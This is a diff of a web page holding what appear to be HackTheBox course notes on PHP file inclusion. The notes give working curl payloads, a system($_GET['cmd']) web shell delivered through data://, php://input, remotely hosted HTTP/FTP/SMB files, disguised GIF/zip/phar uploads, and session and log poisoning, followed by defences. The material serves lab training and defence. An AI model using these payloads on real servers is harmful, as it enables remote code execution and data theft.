-<p><img src="../../../../images/lfi10.png" alt="lfi 10" /></p>
+<p><img src="../../../../images/lfi10.png" alt="lfi 10"></p>
 <p>As you can see, you get an empty result in place of your LFI string, since the <code>config.php</code> most likely sets up the web app configuration and does not render any HTML output.</p>
 <p>This may be useful in certain cases, like accessing local PHP pages you do not have access over, but in most cases, you would be more interested in reading the PHP source code through LFI, as source code tend to reveal important information about the web app. This is where the <code>base64</code> PHP filter gets useful, as you can use it to base64 encode the PHP file, and then you would get the encoded source code instead of having it being executed and rendered. This is especially useful for cases where you are dealing with LFI with appended PHP extensions, because you may be restricted to including PHP files only.</p>
 <h4 id="source-code-disclosure"><a class="header" href="#source-code-disclosure">Source Code Disclosure</a></h4>
 <p>Once you have a list of potential PHP files you want to read, you can start disclosing their sources with the <code>base64</code> PHP filter. Try to read the source code of <code>config.php</code> using the base64 filter, by specifying <code>convert.base64-encode</code> for the <code>read</code> parameter and <code>config</code> for the <code>resource</code> parameter:</p>
 <pre><code>php://filter/read=convert.base64-encode/resource=config
 </code></pre>
-<p><img src="../../../../images/lfi11.png" alt="lfi 11" /></p>
+<p><img src="../../../../images/lfi11.png" alt="lfi 11"></p>
 <p>As you can see, unlike your attempt with regular LFI, using the base64 filter returned an encoded string instead of the empty result you saw earlier. You can now decode this string to get the content of the source code of <code>config.php</code>:</p>
 <pre><code class="language-bash">d41y@htb[/htb]$ echo 'PD9waHAK...SNIP...KICB9Ciov' | base64 -d
 
@@ -621,9 +652,9 @@ if ($_SERVER['REQUEST_METHOD'] == 'GET' &amp;&amp; realpath(__FILE__) == realpat
 <h2 id="remote-code-execution"><a class="header" href="#remote-code-execution">Remote Code Execution</a></h2>
 <h3 id="php-wrappers"><a class="header" href="#php-wrappers">PHP Wrappers</a></h3>
 <h4 id="data"><a class="header" href="#data">Data</a></h4>
-<p>The <code>data</code> wrapper can be used to include external data, including PHP code. However, the data wrapper is only available to use if the <code>allow_url_include</code> setting is enabled in the PHP configurations. So, let's first confirm whether this setting is enabled, by reading the PHP configuration file through the LFI vuln.</p>
+<p>The <code>data</code> wrapper can be used to include external data, including PHP code. However, the data wrapper is only available to use if the <code>allow_url_include</code> setting is enabled in the PHP configurations. So, let’s first confirm whether this setting is enabled, by reading the PHP configuration file through the LFI vuln.</p>
 <h5 id="checking-php-configurations"><a class="header" href="#checking-php-configurations">Checking PHP Configurations</a></h5>
-<p>To do so, you can include the PHP configuration file found at <code>/etc/php/X.Y/apache2/php.ini</code> for Apache or at <code>/etc/php/X.Y/fpm/php.ini</code> for Nginx, where <code>X.Y</code> is your install PHP version. You can start with the latest PHP version, and try earlier versions if you couldn't locate the configuration file. You will also use the base64 filter you used in the previous section, as <code>.ini</code> files are similar to <code>.php</code> files and should be encoded to avoid breaking. Finally, you'll use cURL or Burp instead of a Browser, as the output string could be very long and you should be able to properly capture it.</p>
+<p>To do so, you can include the PHP configuration file found at <code>/etc/php/X.Y/apache2/php.ini</code> for Apache or at <code>/etc/php/X.Y/fpm/php.ini</code> for Nginx, where <code>X.Y</code> is your install PHP version. You can start with the latest PHP version, and try earlier versions if you couldn’t locate the configuration file. You will also use the base64 filter you used in the previous section, as <code>.ini</code> files are similar to <code>.php</code> files and should be encoded to avoid breaking. Finally, you’ll use cURL or Burp instead of a Browser, as the output string could be very long and you should be able to properly capture it.</p>
 <pre><code class="language-bash">d41y@htb[/htb]$ curl "http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
 &lt;!DOCTYPE html&gt;
 
@@ -649,20 +680,20 @@ allow_url_include = On
 PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
 </code></pre>
 <p>Now, you can URL encode the base64 string, and then pass it to the data wrapper with <code>data://text/plain;base64,</code>. Finally, you can pass commands to the web shell with <code>&amp;cmd=&lt;COMMAND&gt;</code>:</p>
-<p><img src="../../../../images/lfi12.png" alt="lfi 12" /></p>
+<p><img src="../../../../images/lfi12.png" alt="lfi 12"></p>
 <p>You may also use cURL for the same attack:</p>
 <pre><code class="language-bash">d41y@htb[/htb]$ curl -s 'http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&amp;cmd=id' | grep uid
             uid=33(www-data) gid=33(www-data) groups=33(www-data)
 </code></pre>
 <h4 id="input"><a class="header" href="#input">Input</a></h4>
-<p>Similar to the <code>data</code> wrapper, the <code>input</code> wrapper can be used to include external input and execute PHP code. The difference between it and the <code>data</code> wrapper is that you pass your input to the <code>input</code> wrapper as a POST request's data. So, the vulnerable parameter must accept POST requests for this attack to work. Finally, the <code>input</code> wrapper also depends on the <code>allow_url_include</code> setting, as mentioned earlier.</p>
+<p>Similar to the <code>data</code> wrapper, the <code>input</code> wrapper can be used to include external input and execute PHP code. The difference between it and the <code>data</code> wrapper is that you pass your input to the <code>input</code> wrapper as a POST request’s data. So, the vulnerable parameter must accept POST requests for this attack to work. Finally, the <code>input</code> wrapper also depends on the <code>allow_url_include</code> setting, as mentioned earlier.</p>
 <p>To repeat your earlier attack but with the <code>input</code> wrapper, you can send a POST request to the vulnerable URL and add your web shell as POST data. To execute a command, you would pass it as a GET parameter, as you did in your previous attack:</p>
 <pre><code class="language-bash">d41y@htb[/htb]$ curl -s -X POST --data '&lt;?php system($_GET["cmd"]); ?&gt;' "http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=php://input&amp;cmd=id" | grep uid
             uid=33(www-data) gid=33(www-data) groups=33(www-data)
 </code></pre>
 <h4 id="expect"><a class="header" href="#expect">Expect</a></h4>
-<p>Finally, you may utilize the <code>expect</code> wrapper, which allows you to directly run commands through URL streams. Expect works very similar to the web shells you've used earlier, but don't need to provide a web shell, as it is designed to execute commands.</p>
-<p>However, expect is an external wrapper, so it needs to be manually installed and enabled on the back-end server, though some web apps rely on it for their core functionality, so you may find it in specific cases. You can determine whether is is installed on the back-end server just like you did with <code>allow_url_include</code> earlier, but you'd grep for <code>expect</code> instead, and if it is installed and enabled you'd get the following:</p>
+<p>Finally, you may utilize the <code>expect</code> wrapper, which allows you to directly run commands through URL streams. Expect works very similar to the web shells you’ve used earlier, but don’t need to provide a web shell, as it is designed to execute commands.</p>
+<p>However, expect is an external wrapper, so it needs to be manually installed and enabled on the back-end server, though some web apps rely on it for their core functionality, so you may find it in specific cases. You can determine whether is is installed on the back-end server just like you did with <code>allow_url_include</code> earlier, but you’d grep for <code>expect</code> instead, and if it is installed and enabled you’d get the following:</p>
 <pre><code class="language-bash">d41y@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect
 extension=expect
 </code></pre>
@@ -674,7 +705,12 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 <h3 id="remote-file-inclusion-rfi"><a class="header" href="#remote-file-inclusion-rfi">Remote File Inclusion (RFI)</a></h3>
 <h4 id="local-vs-remote-file-inclusion"><a class="header" href="#local-vs-remote-file-inclusion">Local vs. Remote File Inclusion</a></h4>
 <p>When a vulnerable function allows you to include remote files, you may be able to host a malicious script, and then include it in the vulnerable page to execute malicious functions and gain RCE. Following functions that would allow RFI if vulnerable:</p>
-<div class="table-wrapper"><table><thead><tr><th>Function</th><th>Read Content</th><th>Execute</th><th>Remote URL</th></tr></thead><tbody>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Function</th><th>Read Content</th><th>Execute</th><th>Remote URL</th></tr>
+</thead>
+<tbody>
 <tr><td><strong>PHP</strong></td><td></td><td></td><td></td></tr>
 <tr><td><code>include()</code> / <code>include_once()</code></td><td>YES</td><td>YES</td><td>YES</td></tr>
 <tr><td><code>file_get_contents()</code></td><td>YES</td><td>NO</td><td>YES</td></tr>
@@ -683,7 +719,8 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 <tr><td><strong>.NET</strong></td><td></td><td></td><td></td></tr>
 <tr><td><code>@Html.RemotePartial()</code></td><td>YES</td><td>NO</td><td>YES</td></tr>
 <tr><td><code>include</code></td><td>YES</td><td>YES</td><td>YES</td></tr>
-</tbody></table>
+</tbody>
+</table>
 </div>
 <h4 id="verify-rfi"><a class="header" href="#verify-rfi">Verify RFI</a></h4>
 <p>In most languages, including remote URLs is considered as a dangerous practice as it may allow for such vulnerabilities. This is why remote URL inclusion is usually disabled by default. For example, any remote URL inclusion in PHP would require the <code>allow_url_include</code> setting to be enabled. You can check whether this setting is enabled through LFI:</p>
@@ -692,7 +729,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 allow_url_include = On
 </code></pre>
 <p>However, this may not always be reliable, as even if this setting is enabled, the vulnerable function may not allow remote URL inclusion to begin with. So, a more reliable way to determine whether an LFI vulnerability is also vulnerable to RFI is to try and include an URL, and see if you can get its content. At first, you should always start by trying to include a local URL to ensure your attempt does not get blocked by a firewall or other security measures. Use <code>http://127.0.0.1:80/index.php</code> as you input string and see if it gets included.</p>
-<p><img src="../../../../images/lfi13.png" alt="lfi 13" /></p>
+<p><img src="../../../../images/lfi13.png" alt="lfi 13"></p>
 <p>As you can see, the <code>index.php</code> got included in the vulnerable section, so the page is indeed vulnerable to RFI, as you are able to include URLs. Furthermore, the <code>index.php</code> page did not get included as source code text but got executed and rendered as PHP, so the vulnerable function also allows PHP execution, which may allow you to execute code if you include a malicious PHP script that you host on your machine.</p>
 <p>You also see that you were able to specify port 80 and get the web app on that port. If the back-end hosted any other local web app, then you may be able to access them through the RFI vulnerability by applying SSRF techniques on it.</p>
 <h4 id="rce-with-rfi"><a class="header" href="#rce-with-rfi">RCE with RFI</a></h4>
@@ -706,7 +743,7 @@ allow_url_include = On
 Serving HTTP on 0.0.0.0 port &lt;LISTENING_PORT&gt; (http://0.0.0.0:&lt;LISTENING_PORT&gt;/) ...
 </code></pre>
 <p>Now, you can include your local shell through RFI. You will also specify the command to be executed.</p>
-<p><img src="../../../../images/lfi14.png" alt="lfi 14" /></p>
+<p><img src="../../../../images/lfi14.png" alt="lfi 14"></p>
 <p>As you can see, you did get a connection on your python server, and the remote shell was included, and you executed the specified command:</p>
 <pre><code class="language-bash">d41y@htb[/htb]$ sudo python3 -m http.server &lt;LISTENING_PORT&gt;
 Serving HTTP on 0.0.0.0 port &lt;LISTENING_PORT&gt; (http://0.0.0.0:&lt;LISTENING_PORT&gt;/) ...
@@ -714,7 +751,7 @@ Serving HTTP on 0.0.0.0 port &lt;LISTENING_PORT&gt; (http://0.0.0.0:&lt;LISTENIN
 SERVER_IP - - [SNIP] "GET /shell.php HTTP/1.0" 200 -
 </code></pre>
 <h5 id="ftp"><a class="header" href="#ftp">FTP</a></h5>
-<p>You may also host your script through the FTP protocol. You can start a basic FTP server with Python's <code>pyftpdlib</code>:</p>
+<p>You may also host your script through the FTP protocol. You can start a basic FTP server with Python’s <code>pyftpdlib</code>:</p>
 <pre><code class="language-bash">d41y@htb[/htb]$ sudo python -m pyftpdlib -p 21
 
 [SNIP] &gt;&gt;&gt; starting FTP server on 0.0.0.0:21, pid=23686 &lt;&lt;&lt;
@@ -723,7 +760,7 @@ SERVER_IP - - [SNIP] "GET /shell.php HTTP/1.0" 200 -
 [SNIP] passive ports: None
 </code></pre>
 <p>This may be useful in case HTTP ports are blocked by a firewall or the <code>http://</code> string gets blocked by a WAF. To include your script, you can repeat what you did earlier, but use the <code>ftp://</code> scheme in the URL.</p>
-<p><img src="../../../../images/lfi15.png" alt="lfi 15" /></p>
+<p><img src="../../../../images/lfi15.png" alt="lfi 15"></p>
 <p>As you can see, this worked very similar to your HTTP attack, and the command was executed. By default, PHP tries to authenticate as an anonymous user. If the server requires valid authentication, then the credentials can be specified in the URL:</p>
 <pre><code class="language-bash">d41y@htb[/htb]$ curl 'http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=ftp://user:pass@localhost/shell.php&amp;cmd=id'
 ...SNIP...
@@ -731,7 +768,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)File Uploads
 </code></pre>
 <h5 id="smb"><a class="header" href="#smb">SMB</a></h5>
 <p>If the vulnerable web app is hosted on a windows server, then you do not need the <code>allow_url_include</code> setting to be enabled for RFI exploitation, as you can utilize the SMB protocol for the remote file inclusion. This is because Windows treats files on remote SMB servers as normal files, which can be referenced directly with a UNC path.</p>
-<p>You can spin up an SMB server using Impacket's <code>smbserver.py</code>, which allows anonymous authentication by default:</p>
+<p>You can spin up an SMB server using Impacket’s <code>smbserver.py</code>, which allows anonymous authentication by default:</p>
 <pre><code class="language-bash">d41y@htb[/htb]$ impacket-smbserver -smb2support share $(pwd)
 Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
 
@@ -743,11 +780,16 @@ Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
 [*] Config file parsed
 </code></pre>
 <p>Now, you can include your script by using a UNC path (<code>\\&lt;OUR_IP&gt;\share\shell.php</code>), and specify the command with <code>&amp;cmd=whoami</code> as you did earlier:</p>
-<p><img src="../../../../images/lfi16.png" alt="lfi 16" /></p>
+<p><img src="../../../../images/lfi16.png" alt="lfi 16"></p>
 <p>As you can see, this attack works in including your remote script, and you do not need any non-default settings to be enabled. However, you must note that this technique is more likely to work if you were on the same network, as accessing remote SMB servers over the internet may be disabled by default, depending on the Windows Server configurations.</p>
 <h3 id="lfi-and-file-uploads"><a class="header" href="#lfi-and-file-uploads">LFI and File Uploads</a></h3>
 <p>The following are the functions that allow executing code with file inclusion:</p>
-<div class="table-wrapper"><table><thead><tr><th>Function</th><th>Read Content</th><th>Execute</th><th>Remote URL</th></tr></thead><tbody>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Function</th><th>Read Content</th><th>Execute</th><th>Remote URL</th></tr>
+</thead>
+<tbody>
 <tr><td><strong>PHP</strong></td><td></td><td></td><td></td></tr>
 <tr><td><code>include()</code> / <code>include_once()</code></td><td>YES</td><td>YES</td><td>YES</td></tr>
 <tr><td><code>require()</code> / <code>require_once()</code></td><td>YES</td><td>YES</td><td>NO</td></tr>
@@ -757,10 +799,11 @@ Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
 <tr><td><code>import</code></td><td>YES</td><td>YES</td><td>YES</td></tr>
 <tr><td><strong>.NET</strong></td><td></td><td></td><td></td></tr>
 <tr><td><code>include</code></td><td>YES</td><td>YES</td><td>YES</td></tr>
-</tbody></table>
+</tbody>
+</table>
 </div>
 <h4 id="image-upload"><a class="header" href="#image-upload">Image Upload</a></h4>
-<p>... is very common in most modern web apps, as uploading images is widely regarded as safe if the upload function is securely coded.</p>
+<p>… is very common in most modern web apps, as uploading images is widely regarded as safe if the upload function is securely coded.</p>
 <h5 id="crafting-malicious-image"><a class="header" href="#crafting-malicious-image">Crafting Malicious Image</a></h5>
 <p>The first step is to create a malicious image containing a PHP web shell code that still looks and works as an image. So, you will use an allowed image extension in your file (<code>shell.gif</code>), and should also include the image magic bytes at the beginning of the file content, just in case the upload form checks for both the extension and content type as well.</p>
 <pre><code class="language-bash">d41y@htb[/htb]$ echo 'GIF8&lt;?php system($_GET["cmd"]); ?&gt;' &gt; shell.gif
@@ -771,24 +814,26 @@ Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
   <span class="mdbook-callouts-icon"></span>
   note
 </p>
+
 <p>You are using a GIF image in this case since its magic bytes are easily typed, as they are ASCII chars, while other extensions have magic bytes that you would need to URL encode.</p>
 </div>
+
 <p>Now, you need to upload your malicious image file.</p>
-<p><img src="../../../../images/lfi17.png" alt="lfi 17" /></p>
+<p><img src="../../../../images/lfi17.png" alt="lfi 17"></p>
 <h5 id="uploaded-file-path"><a class="header" href="#uploaded-file-path">Uploaded File Path</a></h5>
-<p>Once you've uploaded the file, all you need to do is include it through the LFI vuln. To do that, you need to know the path to your uploaded file. In most cases, especially with images, you would get access to your uploaded file and can get its path from its URL. In your case, if you inspect the source code after uploading the image, you can get its URL:</p>
+<p>Once you’ve uploaded the file, all you need to do is include it through the LFI vuln. To do that, you need to know the path to your uploaded file. In most cases, especially with images, you would get access to your uploaded file and can get its path from its URL. In your case, if you inspect the source code after uploading the image, you can get its URL:</p>
 <pre><code>&lt;img src="/profile_images/shell.gif" class="profile-image" id="profile-image"&gt;
 </code></pre>
 <p>Otherwise, you would need to fuzz for directories.</p>
 <p>With the uploaded file path at hand, all you need to do is to include the uploaded file in the LFI vulnerable function, and the PHP code should get executed.</p>
-<p><img src="../../../../images/lfi18.png" alt="lfi 18" /></p>
+<p><img src="../../../../images/lfi18.png" alt="lfi 18"></p>
 <p>As you can see, you included your file and successfully executed the <code>id</code>  command.</p>
 <h4 id="zip-upload"><a class="header" href="#zip-upload">Zip Upload</a></h4>
-<p>You can utilize zip wrapper to execute PHP code. However, this wrapper isn't enabled by default, so this method may not always work. To do so, you can start by creating a PHP web shell script and zipping it into a zip archive.</p>
+<p>You can utilize zip wrapper to execute PHP code. However, this wrapper isn’t enabled by default, so this method may not always work. To do so, you can start by creating a PHP web shell script and zipping it into a zip archive.</p>
 <pre><code class="language-bash">d41y@htb[/htb]$ echo '&lt;?php system($_GET["cmd"]); ?&gt;' &gt; shell.php &amp;&amp; zip shell.jpg shell.php
 </code></pre>
 <p>Once you uploaded the <code>shell.jpg</code> archive, you can include it with the zip wrapper as <code>zip://shell.jpg</code> (<em>URL encoded</em>), and then refer to any files within it with <code>#shell.php</code>. Finally, you can execute commands:</p>
-<p><img src="../../../../images/lfi19.png" alt="lfi 19" /></p>
+<p><img src="../../../../images/lfi19.png" alt="lfi 19"></p>
 <h4 id="phar-uploads"><a class="header" href="#phar-uploads">Phar Uploads</a></h4>
 <p>Finally, you can use the <code>phar://</code> wrapper to achieve a similar result. To do so, you will first write the following PHP script into a <code>shell.php</code> file:</p>
 <pre><code class="language-php">&lt;?php
@@ -803,11 +848,16 @@ $phar-&gt;stopBuffering();
 <pre><code class="language-bash">d41y@htb[/htb]$ php --define phar.readonly=0 shell.php &amp;&amp; mv shell.phar shell.jpg
 </code></pre>
 <p>Now, you would have a phar file called <code>shell.jpg</code>. Once you upload it to the web app, you can simply call it with <code>phar://</code> and provide its URL path, and then specify the phar sub-file with <code>/shell.txt</code> (<em>URL encoded</em>) to get the output of the command you specify.</p>
-<p><img src="../../../../images/lfi20.png" alt="lfi 20" /></p>
+<p><img src="../../../../images/lfi20.png" alt="lfi 20"></p>
 <h3 id="log-poisoning"><a class="header" href="#log-poisoning">Log Poisoning</a></h3>
 <p>These attacks rely on written PHP code that gets logged into a log file, and then including that log file to execute PHP code.</p>
 <p>Any of the following functions with <code>Execute</code> privileges should be vulnerable to these attacks:</p>
-<div class="table-wrapper"><table><thead><tr><th>Function</th><th>Read Content</th><th>Execute</th><th>Remote URL</th></tr></thead><tbody>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Function</th><th>Read Content</th><th>Execute</th><th>Remote URL</th></tr>
+</thead>
+<tbody>
 <tr><td><strong>PHP</strong></td><td></td><td></td><td></td></tr>
 <tr><td><code>include()</code> / <code>include_once()</code></td><td>YES</td><td>YES</td><td>YES</td></tr>
 <tr><td><code>require()</code> / <code>require_once()</code></td><td>YES</td><td>YES</td><td>NO</td></tr>
@@ -817,50 +867,53 @@ $phar-&gt;stopBuffering();
 <tr><td><code>import</code></td><td>YES</td><td>YES</td><td>YES</td></tr>
 <tr><td><strong>.NET</strong></td><td></td><td></td><td></td></tr>
 <tr><td><code>include</code></td><td>YES</td><td>YES</td><td>YES</td></tr>
-</tbody></table>
+</tbody>
+</table>
 </div>
 <h4 id="php-session-poisoning"><a class="header" href="#php-session-poisoning">PHP Session Poisoning</a></h4>
-<p>Most PHP web apps utilize <code>PHPSESSID</code> cookies, which can hold specific user-related data on the back-end, so the web app can keep track of user details through their cookies. These details are stored in session files on the back-end, and saved in <code>/var/lib/php/sessions/</code> on Linux and in <code>C:\Windows\Temp</code> on Windows. The name of the file that contains your user's data matches the name of your <code>PHPSESSID</code> cookie with the <code>sess_</code> prefix like <code>/var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3</code>.</p>
+<p>Most PHP web apps utilize <code>PHPSESSID</code> cookies, which can hold specific user-related data on the back-end, so the web app can keep track of user details through their cookies. These details are stored in session files on the back-end, and saved in <code>/var/lib/php/sessions/</code> on Linux and in <code>C:\Windows\Temp</code> on Windows. The name of the file that contains your user’s data matches the name of your <code>PHPSESSID</code> cookie with the <code>sess_</code> prefix like <code>/var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3</code>.</p>
 <p>The first thing you need to do in a PHP Session Poisoning Attack is to examine your PHPSESSID file and see if it contains any data you can control and poison.</p>
-<p><img src="../../../../images/lfi21.png" alt="lfi 21" /></p>
+<p><img src="../../../../images/lfi21.png" alt="lfi 21"></p>
 <p>As you can see, your PHPSESSID cookie value is <code>nhhv8i0o6ua4g88bkdl9u1fdsd</code>, so it should be stored at <code>/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd</code>. When trying to include:</p>
-<p><img src="../../../../images/lfi22.png" alt="lfi 22" /></p>
+<p><img src="../../../../images/lfi22.png" alt="lfi 22"></p>
 <p>You can see that the session file contains two values: <code>page</code>, which shows the selected language page, and <code>preference</code>, which shows the selected language. The <code>preference</code> value is not under your control, as you did not specify it anywhere and must be automatically specified. However, the <code>page</code> value is under your control, as you can control it through the <code>?language=</code> parameter.</p>
 <p>Try setting the value of <code>page</code> a custom value and see if it changes in the session file. You can do so by simply visiting the page with <code>?language=session_poisoning</code>.</p>
 <pre><code>http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=session_poisoning
 </code></pre>
 <p>When including again:</p>
-<p><img src="../../../../images/lfi23.png" alt="lfi 23" /></p>
+<p><img src="../../../../images/lfi23.png" alt="lfi 23"></p>
 <p>This time, the session file contains <code>session_poisoning</code> instead of <code>es.php</code>, which confirms your ability to control the value of <code>page</code> in the session file. Your next step is to perform the <code>poisoning</code> step by writing PHP code to the session file. You can write a basic PHP web shell by changing the <code>?language=</code> parameter to a URL encoded web shell:</p>
 <pre><code>http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
 </code></pre>
 <p>Finally, you can include the session file and use the <code>&amp;cmd=id</code> to execute commands:</p>
-<p><img src="../../../../images/lfi24.png" alt="lfi 24" /></p>
+<p><img src="../../../../images/lfi24.png" alt="lfi 24"></p>
 <h4 id="server-log-poisoning"><a class="header" href="#server-log-poisoning">Server Log Poisoning</a></h4>
-<p>Both Apache and Nginx maintain various log files, such as <code>access.log</code> and <code>error.log</code>. The <code>access.log</code> file contains varios information about all requests made to the server, including each request's User-Agent header. As you can control the User-Agent in your requests, you can use it to poison the server logs as you did above.</p>
+<p>Both Apache and Nginx maintain various log files, such as <code>access.log</code> and <code>error.log</code>. The <code>access.log</code> file contains varios information about all requests made to the server, including each request’s User-Agent header. As you can control the User-Agent in your requests, you can use it to poison the server logs as you did above.</p>
 <p>Once poisoned, you need to include the logs through the LFI vuln, and for that you need to have read-access over the logs. Nginx logs are readable by low privileged users by default, while the Apache logs are only readable by users with high privileges. However, in older or misconfigured Apache servers, these logs may be readable by low-privileged users.</p>
 <p>By default, Apache logs are located in <code>/var/log/apache2/</code> on Linux and in <code>C:\xampp\apache\logs\</code> on Windows, while Nginx logs are located in <code>/var/log/nginx/</code> on Linux and in <code>C:\nginx\log\</code> on Windows. However, the logs may be in a different location in some cases, so you may use a LFI wordlist to fuzz for their locations.</p>
 <p>Try including the Apache access log:</p>
-<p><img src="../../../../images/lfi25.png" alt="lfi 25" /></p>
+<p><img src="../../../../images/lfi25.png" alt="lfi 25"></p>
 <p>As you can see, you can the read the log. The log contains the remote IP address, request page, response code, and the User-Agent header. As mentioned earlier, the User-Agent header is controlled by you through th HTTP request headers, so you should be able to poison this value.</p>
 <p>To do so, you can use Burp:</p>
-<p><img src="../../../../images/lfi26.png" alt="lfi 26" /></p>
+<p><img src="../../../../images/lfi26.png" alt="lfi 26"></p>
 <p>As expected, you custom User-Agent value is visible in the included log file. Now, you can poison the User-Agent header by setting it to a basic PHP web shell.</p>
-<p><img src="../../../../images/lfi27.png" alt="lfi 27" /></p>
+<p><img src="../../../../images/lfi27.png" alt="lfi 27"></p>
 <p>You may also poison the log by sending a request through cURL.</p>
 <pre><code class="language-bash">d41y@htb[/htb]$ echo -n "User-Agent: &lt;?php system(\$_GET['cmd']); ?&gt;" &gt; Poison
 d41y@htb[/htb]$ curl -s "http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php" -H @Poison
 </code></pre>
 <p>As the log should now contain PHP code, the LFI vuln should execute this code, and you should be able to gain RCE.</p>
-<p><img src="../../../../images/lfi28.png" alt="lfi 28" /></p>
+<p><img src="../../../../images/lfi28.png" alt="lfi 28"></p>
 <p>You see that you successfully executed the command. The exact same attack can be carried out on Nginx logs as well.</p>
 <div class="mdbook-callouts mdbook-callouts-tip">
 <p class="mdbook-callouts-title">
   <span class="mdbook-callouts-icon"></span>
   tip
 </p>
+
 <p>The <code>User-Agent</code> header is also shown on process files under the Linux <code>/proc/</code> directory. So, you can try including the <code>/proc/self/environ</code> or <code>/proc/self/fd/N</code>  files (<em>where N is a PID usually between 0-50</em>), and you may be able to perform the same attack on these files. This may become handy in case you did not have read access over the server logs, however, these files may only be readable by privileged users as well.</p>
 </div>
+
 <p>Finally, there are other similar log poisoning techniques that you ma utilize on various system logs, depending on which logs you have read access over. The following are some of the service logs you may be able to read:</p>
 <ul>
 <li><code>/var/log/sshd.log</code></li>
@@ -889,7 +942,7 @@ ________________________________________________
 
 language                    [Status: xxx, Size: xxx, Words: xxx, Lines: xxx]
 </code></pre>
-<p>Once you identify an exposed parameter that isn't linked to any forms you tested, you can perform all of the LFI tests discussed before. This is not unique to LFI vulns but also applies to most web vulnerabilities, as exposed parameters may be vulnerable to any other vuln as well.</p>
+<p>Once you identify an exposed parameter that isn’t linked to any forms you tested, you can perform all of the LFI tests discussed before. This is not unique to LFI vulns but also applies to most web vulnerabilities, as exposed parameters may be vulnerable to any other vuln as well.</p>
 <h3 id="lfi-wordlists"><a class="header" href="#lfi-wordlists">LFI wordlists</a></h3>
 <p>There are a number of LFI wordlists you can use for a scan. A good worlist is <code>LFI-Jhaddix.txt</code>, as it contains various bypasses and common files, so it makes it easy to run several tests at once. You can use this wordlist to fuzz the <code>?language=</code> parameter you have been testing.</p>
 <pre><code class="language-bash">d41y@htb[/htb]$ ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=FUZZ' -fs 2287
@@ -1011,7 +1064,7 @@ export APACHE_LOG_DIR=/var/log/apache2$SUFFIX
 <p>Once this is implemented, the user input is not going into the function, but the matched files are used in the function, which avoids file inclusion vulns.</p>
 <h4 id="preventing-directory-traversal"><a class="header" href="#preventing-directory-traversal">Preventing Directory Traversal</a></h4>
 <p>If attackers can control the directory, they can escape the web app and attack something they are more familiar with or use an universal attack chain.</p>
-<p>The best way to prevent directory traversals is to use your programming language's built-in tool to pull only the filename. For example, PHP has <code>basename()</code>, which will read the path and only return the filename portion. If only a filename is given, then it will return just the filename. if just the path is given, it will treat whatever is after the final <code>/</code> as the filename. The downside to this method is that if the app needs to enter any directory, it will not be able to do so.</p>
+<p>The best way to prevent directory traversals is to use your programming language’s built-in tool to pull only the filename. For example, PHP has <code>basename()</code>, which will read the path and only return the filename portion. If only a filename is given, then it will return just the filename. if just the path is given, it will treat whatever is after the final <code>/</code> as the filename. The downside to this method is that if the app needs to enter any directory, it will not be able to do so.</p>
 <p>If you create your own function to do this method, it is possible you are not accounting for a weird edge case. For example, in your bash terminal, if you go into your home directory and run the command <code>cat .?/.*/.?/etc/passwd</code>. You will see Bash allows for the <code>?</code> and <code>*</code> wildcards to be used as a <code>.</code>. Now if you type <code>php -a</code> to enter the PHP Command Line interpreter and run <code>echo file_get_contents('.?/.*/.?/etc/passwd');</code>, you will see PHP does not have the same behaviour with the wildcards. If you replace <code>?</code> and <code>*</code> with <code>.</code>, the command will work as expected. This demonstrates there is an edge case with the above function. If you have PHP execute bash with the <code>system()</code> function, the attacker would be able to bypass your directory traversal prevention. If you use native functions to the framework you are in, there is a chance other users would catch edge cases like this and fix it before it gets exploited in your web app.</p>
 <p>Furthermore, you can sanitize the user input to recursively remove any attempts of traversing directories:</p>
 <pre><code class="language-php">while(substr_count($input, '../', 0)) {
@@ -1021,24 +1074,23 @@ export APACHE_LOG_DIR=/var/log/apache2$SUFFIX
 <p>As you can see, this code recursively removes <code>../</code> sub-strings, so even if the resulting string contains <code>../</code> it would still remove it, which would prevent some of the bypasses.</p>
 <h4 id="web-server-configuration"><a class="header" href="#web-server-configuration">Web Server Configuration</a></h4>
 <p>Several configs may also be utilized to reduce the impact of file inclusion vulns in case they occur. For example, you should globally disable the inclusion of remote files. In PHP this can be done by setting <code>allow_url_fopen</code> and <code>allow_url_include</code> to Off.</p>
-<p>It's also often possible to lock web apps to their web root directory, preventing them from accessing non-web related files. The most common way to do this is by running the app within Docker. However, if that is not an option, many languages often have a way to prevent accessing files outside of the web directory. In PHP that can be done by adding <code>open_basedir = /var/www</code> in the php.ini file. Furthermore, you should ensure that certain potentially dangerous modules are disabled, like the PHP <code>expect://</code> wrapper and the PHP module <code>mod_userdir</code>.</p>
